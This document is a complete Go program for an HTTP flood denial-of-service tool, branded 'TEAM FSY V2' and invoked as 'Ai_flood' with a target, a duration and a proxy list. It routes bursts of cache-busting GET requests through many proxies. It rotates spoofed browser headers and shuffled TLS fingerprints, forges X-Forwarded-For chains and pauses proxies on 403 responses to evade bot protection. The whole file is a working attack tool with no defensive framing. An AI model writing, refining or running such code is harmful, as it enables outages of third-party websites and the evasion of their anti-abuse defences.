package main

import (
	"bufio"
	"context"
	cryptorand "crypto/rand"
	"crypto/tls"
	"fmt"
	"io"
	"math"
	"math/big"
	"math/rand"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"go.uber.org/zap"
	"go.uber.org/zap/zapcore"
	"golang.org/x/net/http2"
	"golang.org/x/net/publicsuffix"
)

const (
	logisticR = 3.9999999
	gnosticX0 = 0.618033
)

type Profile struct {
	UserAgent             string
	SecCHUA               string
	SecCHUAFull           string
	SecCHUAMobile         string
	SecCHUAPlatform       string
	Accept                string
	Encoding              string
	Language              string
	Connection            string
	CacheControl          string
	UpgradeHeaders        []string
	XForwardedFor         string
	TE                    string
	Priority              string
	SecGPC                string
	CustomHeaders         map[string]string
	CipherSuites          []uint16
	CurvePreferences      []tls.CurveID
	NextProtos            []string
	Signature             string
}

type Proxy struct {
	Addr           string
	Client         *http.Client
	Jar            *cookiejar.Jar
	Profile        *Profile
	Success        atomic.Int64
	Fail           atomic.Int64
	RPS            atomic.Int64
	LastActive     time.Time
	EntropySeed    int64
	PolymorphCnt   atomic.Uint64
	JA3Drift       atomic.Int32
	Paused         bool
	PauseUntil     time.Time
	mu             sync.Mutex
}

type KRTechSigmaUltra struct {
	target      string
	duration    time.Duration
	proxies     []*Proxy
	success     atomic.Int64
	fail        atomic.Int64
	startTime   time.Time
	wg          sync.WaitGroup
	ctx         context.Context
	cancel      context.CancelFunc
	entropyPool *rand.Rand
	chaosX      float64
	logger      *zap.Logger
	mu          sync.Mutex
	statusMap   map[int]*atomic.Int64
}

var baseProfiles = []Profile{
	{
		UserAgent:       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
		SecCHUA:         `"Google Chrome";v="139", "Not)A;Brand";v="8", "Chromium";v="139"`,
		SecCHUAFull:     `"Google Chrome";v="139.0.0.0", "Chromium";v="139.0.0.0", "Not)A;Brand";v="99.0.0.0"`,
		SecCHUAMobile:   "?0",
		SecCHUAPlatform: `"Windows"`,
		Accept:          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Encoding:        "gzip, deflate, br, zstd",
		Language:        "en-US,en;q=0.9",
		Connection:      "keep-alive",
		CacheControl:    "no-cache, no-store, must-revalidate",
		UpgradeHeaders:  []string{"Upgrade-Insecure-Requests: 1", "Sec-Fetch-Site: none", "Sec-Fetch-Mode: navigate", "Sec-Fetch-User: ?1", "Sec-Fetch-Dest: document"},
		CustomHeaders:   map[string]string{},
		CipherSuites:    []uint16{tls.TLS_AES_128_GCM_SHA256, tls.TLS_AES_256_GCM_SHA384, tls.TLS_CHACHA20_POLY1305_SHA256},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
		NextProtos:      []string{"h2", "http/1.1"},
	},
	{
		UserAgent:       "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/139.0.7258.76 Mobile/15E148 Safari/604.1",
		SecCHUA:         `"Google Chrome";v="139", "Not)A;Brand";v="8", "Chromium";v="139"`,
		SecCHUAMobile:   "?1",
		SecCHUAPlatform: `"iOS"`,
		Accept:          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		Encoding:        "gzip, deflate, br",
		Language:        "en-US,en;q=0.9,fil;q=0.8",
		Connection:      "keep-alive",
		CacheControl:    "no-cache",
		UpgradeHeaders:  []string{"Sec-Fetch-Dest: document", "Sec-Fetch-Mode: navigate"},
		CustomHeaders:   map[string]string{},
		CipherSuites:    []uint16{tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256, tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP521},
		NextProtos:      []string{"h2", "http/1.1"},
	},
}

func NewKRTechSigmaUltra(target string, duration time.Duration, proxyList []string) (*KRTechSigmaUltra, error) {
	if !strings.HasPrefix(target, "http") {
		target = "https://" + target
	}
	if _, err := url.Parse(target); err != nil {
		return nil, err
	}

	config := zap.NewProductionConfig()
	config.EncoderConfig = zapcore.EncoderConfig{
		TimeKey:        "ts",
		LevelKey:       "level",
		NameKey:        "logger",
		MessageKey:     "msg",
		LineEnding:     zapcore.DefaultLineEnding,
		EncodeLevel:    zapcore.CapitalColorLevelEncoder,
		EncodeTime:     zapcore.ISO8601TimeEncoder,
		EncodeDuration: zapcore.StringDurationEncoder,
	}
	logger, _ := config.Build()

	ctx, cancel := context.WithCancel(context.Background())
	seedBig, _ := cryptorand.Int(cryptorand.Reader, big.NewInt(math.MaxInt64))
	entropy := rand.New(rand.NewSource(seedBig.Int64()))

	k := &KRTechSigmaUltra{
		target:      target,
		duration:    duration,
		startTime:   time.Now(),
		ctx:         ctx,
		cancel:      cancel,
		entropyPool: entropy,
		chaosX:      gnosticX0,
		logger:      logger,
		statusMap:   make(map[int]*atomic.Int64),
	}

	for _, addr := range proxyList {
		proxyURL, _ := url.Parse("http://" + addr)
		profile := generatePolymorphicProfile(k)
		jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List})

		tlsConfig := &tls.Config{
			InsecureSkipVerify:       true,
			MinVersion:               tls.VersionTLS13,
			MaxVersion:               tls.VersionTLS13,
			CipherSuites:             shuffleUint16(entropy, profile.CipherSuites),
			CurvePreferences:         shuffleCurveID(entropy, profile.CurvePreferences),
			NextProtos:               profile.NextProtos,
			PreferServerCipherSuites: entropy.Float64() < 0.5,
		}

		transport := &http.Transport{
			Proxy:                 http.ProxyURL(proxyURL),
			MaxIdleConns:          1000,
			MaxIdleConnsPerHost:   1000,
			MaxConnsPerHost:       0,
			IdleConnTimeout:       120 * time.Second,
			DisableCompression:    false,
			DisableKeepAlives:     false,
			ForceAttemptHTTP2:     false,
			TLSClientConfig:       tlsConfig,
			DialContext: (&net.Dialer{
				Timeout:   3 * time.Second,
				KeepAlive: 30 * time.Second,
			}).DialContext,
		}
		http2.ConfigureTransport(transport)

		client := &http.Client{
			Transport: transport,
			Timeout:   20 * time.Second,
			Jar:       jar,
		}

		k.proxies = append(k.proxies, &Proxy{
			Addr:        addr,
			Client:      client,
			Jar:         jar,
			Profile:     profile,
			LastActive:  time.Now(),
			EntropySeed: seedBig.Int64(),
		})
	}

	if len(k.proxies) == 0 {
		return nil, fmt.Errorf("no valid proxies")
	}
	return k, nil
}

func shuffleUint16(r *rand.Rand, s []uint16) []uint16 {
	c := append([]uint16(nil), s...)
	r.Shuffle(len(c), func(i, j int) { c[i], c[j] = c[j], c[i] })
	return c
}
func shuffleCurveID(r *rand.Rand, s []tls.CurveID) []tls.CurveID {
	c := append([]tls.CurveID(nil), s...)
	r.Shuffle(len(c), func(i, j int) { c[i], c[j] = c[j], c[i] })
	return c
}

func generatePolymorphicProfile(k *KRTechSigmaUltra) *Profile {
	k.mu.Lock()
	k.chaosX = logisticR * k.chaosX * (1 - k.chaosX)
	mut := k.chaosX
	k.mu.Unlock()

	base := baseProfiles[k.entropyPool.Intn(len(baseProfiles))]
	prof := &Profile{
		UserAgent:             base.UserAgent,
		SecCHUA:               base.SecCHUA,
		SecCHUAFull:           base.SecCHUAFull,
		SecCHUAMobile:         base.SecCHUAMobile,
		SecCHUAPlatform:       base.SecCHUAPlatform,
		Accept:                base.Accept,
		Encoding:              base.Encoding,
		Language:              base.Language,
		Connection:            base.Connection,
		CacheControl:          base.CacheControl,
		UpgradeHeaders:        append([]string(nil), base.UpgradeHeaders...),
		CustomHeaders:         make(map[string]string),
		CipherSuites:          append([]uint16(nil), base.CipherSuites...),
		CurvePreferences:      append([]tls.CurveID(nil), base.CurvePreferences...),
		NextProtos:            append([]string(nil), base.NextProtos...),
	}

	if mut < 0.3 {
		prof.UserAgent += fmt.Sprintf(" Edg/%d.0.%d.%d", 130+k.entropyPool.Intn(20), k.entropyPool.Intn(1000), k.entropyPool.Intn(100))
	}
	if mut < 0.25 {
		chain := ""
		for i := 0; i < 2+k.entropyPool.Intn(4); i++ {
			chain += fmt.Sprintf("%d.%d.%d.%d, ", k.entropyPool.Intn(256), k.entropyPool.Intn(256), k.entropyPool.Intn(256), k.entropyPool.Intn(256))
		}
		prof.XForwardedFor = strings.TrimSuffix(chain, ", ")
	}
	return prof
}

func randomString(r *rand.Rand, n int) string {
	letters := []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-._")
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[r.Intn(len(letters))]
	}
	return string(b)
}

func (k *KRTechSigmaUltra) Run() {
	k.logger.Info("TEAM FSY V2",
		zap.String("target", k.target),
		zap.Int("proxies", len(k.proxies)),
		zap.Duration("duration", k.duration))

	k.wg.Add(len(k.proxies))
	for _, p := range k.proxies {
		go k.proxyWorker(p)
	}

	go k.dashboard()

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() { <-sig; k.cancel() }()

	select {
	case <-k.ctx.Done():
	case <-time.After(k.duration):
	}
	k.cancel()
	k.wg.Wait()
	k.finalReport()
}

func (k *KRTechSigmaUltra) proxyWorker(p *Proxy) {
	defer k.wg.Done()
	rng := rand.New(rand.NewSource(p.EntropySeed + time.Now().UnixNano()))
	params := []string{"q", "id", "search", "page", "token", "ts", "rnd", "v", "sid", "ref", "utm_source"}
	referers := []string{k.target, "https://www.google.com/", ""}
	methods := []string{"GET"}
	headerOrder := []string{
		"Host", "User-Agent", "Accept", "Accept-Encoding", "Accept-Language",
		"Connection", "Cache-Control", "Upgrade-Insecure-Requests", "Sec-Fetch-Dest",
		"Sec-Fetch-Mode", "Sec-Fetch-Site", "Sec-Fetch-User", "Referer",
		"Sec-CH-UA", "Sec-CH-UA-Mobile", "Sec-CH-UA-Platform", "TE",
	}

	for {
		select {
		case <-k.ctx.Done():
			return
		default:
		}

		p.mu.Lock()
		if p.Paused && p.PauseUntil.Before(time.Now()) {
			if k.checkProxyHealth(p, rng) {
				p.Paused = false
				k.logger.Info("Proxy RESUMED", zap.String("proxy", p.Addr))
			}
		}
		if p.Paused {
			p.mu.Unlock()
			time.Sleep(3 * time.Second)
			continue
		}
		p.mu.Unlock()

		if p.PolymorphCnt.Add(1)%uint64(30+rng.Intn(90)) == 0 {
			p.Profile = generatePolymorphicProfile(k)
			p.JA3Drift.Add(1)
		}

		urlStr := k.target
		if rng.Float64() < 0.85 {
			pName := params[rng.Intn(len(params))]
			pVal := fmt.Sprintf("%d", rng.Int63n(1<<60))
			sep := "?"
			if strings.Contains(urlStr, "?") {
				sep = "&"
			}
			urlStr += sep + pName + "=" + pVal
			if rng.Float64() < 0.3 {
				urlStr += "#" + randomString(rng, 16)
			}
		}

		method := methods[rng.Intn(len(methods))]
		req, _ := http.NewRequestWithContext(k.ctx, method, urlStr, nil)
		u, _ := url.Parse(urlStr)
		req.Host = u.Host

		prof := p.Profile
		headerMap := map[string]string{
			"Host":                   u.Host,
			"User-Agent":             prof.UserAgent,
			"Accept":                 prof.Accept,
			"Accept-Encoding":        prof.Encoding,
			"Accept-Language":        prof.Language,
			"Connection":             prof.Connection,
			"Cache-Control":          prof.CacheControl,
			"Upgrade-Insecure-Requests": "1",
			"Sec-Fetch-Dest":         "document",
			"Sec-Fetch-Mode":         "navigate",
			"Sec-Fetch-Site":         "none",
			"Sec-Fetch-User":         "?1",
			"Referer":                referers[rng.Intn(len(referers))],
			"Sec-CH-UA":              prof.SecCHUA,
			"Sec-CH-UA-Mobile":       prof.SecCHUAMobile,
			"Sec-CH-UA-Platform":     prof.SecCHUAPlatform,
			"TE":                     "trailers",
		}
		for k, v := range prof.CustomHeaders {
			headerMap[k] = v
		}
		if prof.XForwardedFor != "" {
			headerMap["X-Forwarded-For"] = prof.XForwardedFor
		}

		for _, key := range headerOrder {
			if val, ok := headerMap[key]; ok {
				req.Header.Set(key, val)
			}
		}
		for _, up := range prof.UpgradeHeaders {
			if strings.Contains(up, ":") {
				parts := strings.SplitN(up, ":", 2)
				req.Header.Set(strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]))
			}
		}

		p.Jar.SetCookies(u, p.Jar.Cookies(u))

		burst := 3 + rng.Intn(3)
		for b := 0; b < burst; b++ {
			time.Sleep(time.Millisecond * time.Duration(50 + rng.Intn(120)))
			resp, err := p.Client.Do(req)
			if err != nil {
				k.fail.Add(1)
				p.Fail.Add(1)
				k.statusCounter(0).Add(1)
				continue
			}

			p.RPS.Add(1)
			code := resp.StatusCode
			k.statusCounter(code).Add(1)

			switch code {
			case 200:
				k.success.Add(1)
				p.Success.Add(1)
				p.mu.Lock()
				if p.Paused {
					p.Paused = false
					k.logger.Info("Proxy AUTO-RESUMED", zap.String("proxy", p.Addr))
				}
				p.mu.Unlock()
			case 403:
				k.fail.Add(1)
				p.Fail.Add(1)
				p.mu.Lock()
				if !p.Paused {
					p.Paused = true
					p.PauseUntil = time.Now().Add(time.Duration(10+rng.Intn(25)) * time.Second)
					k.logger.Warn("Proxy PAUSED (403)", zap.String("proxy", p.Addr), zap.Duration("until", p.PauseUntil.Sub(time.Now())))
				}
				p.mu.Unlock()
			default:
				if code >= 400 {
					k.fail.Add(1)
					p.Fail.Add(1)
				}
			}

			p.Jar.SetCookies(u, resp.Cookies())
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}

		time.Sleep(time.Millisecond * time.Duration(10 + rng.Intn(20)))
	}
}

func (k *KRTechSigmaUltra) statusCounter(code int) *atomic.Int64 {
	k.mu.Lock()
	defer k.mu.Unlock()
	if _, ok := k.statusMap[code]; !ok {
		k.statusMap[code] = &atomic.Int64{}
	}
	return k.statusMap[code]
}

func (k *KRTechSigmaUltra) checkProxyHealth(p *Proxy, rng *rand.Rand) bool {
	u, _ := url.Parse(k.target)
	req, _ := http.NewRequestWithContext(k.ctx, "GET", k.target, nil)
	req.Header.Set("User-Agent", p.Profile.UserAgent)
	req.Host = u.Host
	resp, err := p.Client.Do(req)
	if err != nil || resp.StatusCode != 200 {
		if resp != nil {
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return true
}

func (k *KRTechSigmaUltra) dashboard() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	const (
		reset   = "\033[0m"
		green   = "\033[32m"
		red     = "\033[31m"
		yellow  = "\033[33m"
		magenta = "\033[35m"
		cyan    = "\033[36m"
		white   = "\033[97m"
		gray    = "\033[90m"
	)

	for {
		select {
		case <-ticker.C:
			up := time.Since(k.startTime)
			total := k.success.Load() + k.fail.Load()
			rps := float64(total) / up.Seconds()
			active := 0
			drift := int32(0)

			for _, p := range k.proxies {
				p.mu.Lock()
				if !p.Paused {
					active++
				}
				p.mu.Unlock()
				drift += p.JA3Drift.Load()
			}

			var statusLine strings.Builder
			seen := 0
			for code := 100; code <= 599; code++ {
				if c, ok := k.statusMap[code]; ok {
					val := c.Load()
					if val == 0 {
						continue
					}
					color := gray
					switch {
					case code == 200:
						color = green
					case code >= 300 && code < 400:
						color = yellow
					case code >= 400 && code < 500:
						color = red
					case code >= 500:
						color = magenta
					}
					if seen > 0 {
						statusLine.WriteString("  ")
					}
					statusLine.WriteString(fmt.Sprintf("%s%d%s: %s%d%s", white, code, reset, color, val, reset))
					seen++
				}
			}
			if seen == 0 {
				statusLine.WriteString(gray + "waiting..." + reset)
			}

			fmt.Printf("\r%s[ULTRA] %s | RPS: %.0f | PROXY: %d/%d | JA3: %d | UP: %s%s",
				cyan, statusLine.String(), rps, active, len(k.proxies), drift, up.Truncate(100*time.Millisecond), reset)
		}
	}
}

func (k *KRTechSigmaUltra) finalReport() {
	up := time.Since(k.startTime)
	total := k.success.Load() + k.fail.Load()
	rps := float64(total) / up.Seconds()
	drift := int32(0)
	for _, p := range k.proxies {
		drift += p.JA3Drift.Load()
	}

	k.logger.Info("COMPLETE",
		zap.Duration("duration", up),
		zap.Int64("total_requests", total),
		zap.Float64("avg_rps", rps),
		zap.Int64("success", k.success.Load()),
		zap.Int64("failed", k.fail.Load()),
		zap.Int32("total_ja3_drift", drift))

	fmt.Printf("\n\nPER-PROXY:\n")
	fmt.Printf("%-20s %-12s %-10s %-10s %-14s %-10s %-8s\n", "PROXY", "SUCCESS", "FAIL", "RPS", "POLY", "JA3", "STATUS")
	for _, p := range k.proxies {
		prps := float64(p.Success.Load()+p.Fail.Load()) / up.Seconds()
		status := "ACTIVE"
		p.mu.Lock()
		if p.Paused {
			status = "PAUSED"
		}
		p.mu.Unlock()
		fmt.Printf("%-20s %-12d %-10d %-10.1f %-14d %-10d %-8s\n",
			truncateAddr(p.Addr), p.Success.Load(), p.Fail.Load(), prps,
			p.PolymorphCnt.Load(), p.JA3Drift.Load(), status)
	}
	fmt.Println("")
}

func truncateAddr(s string) string {
	if len(s) > 18 {
		return s[:18] + ".."
	}
	return s
}

func loadProxies(file string) ([]string, error) {
	f, err := os.Open(file)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	var list []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		l := strings.TrimSpace(sc.Text())
		if l != "" && !strings.HasPrefix(l, "#") && strings.Contains(l, ":") {
			list = append(list, l)
		}
	}
	return list, sc.Err()
}

func main() {
	if len(os.Args) != 4 {
		fmt.Println("Usage: Ai_flood <target> <duration_sec> <proxies.txt>")
		os.Exit(1)
	}

	target := os.Args[1]
	durSec, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Printf("Invalid duration: %v\n", err)
		os.Exit(1)
	}
	proxyFile := os.Args[3]

	duration := time.Duration(durSec) * time.Second
	proxies, err := loadProxies(proxyFile)
	if err != nil || len(proxies) == 0 {
		fmt.Printf("Failed to load proxies: %v\n", err)
		os.Exit(1)
	}

	runtime.GOMAXPROCS(runtime.NumCPU() * 2)

	k, err := NewKRTechSigmaUltra(target, duration, proxies)
	if err != nil {
		fmt.Printf("Init failed: %v\n", err)
		os.Exit(1)
	}

	k.Run()
}

























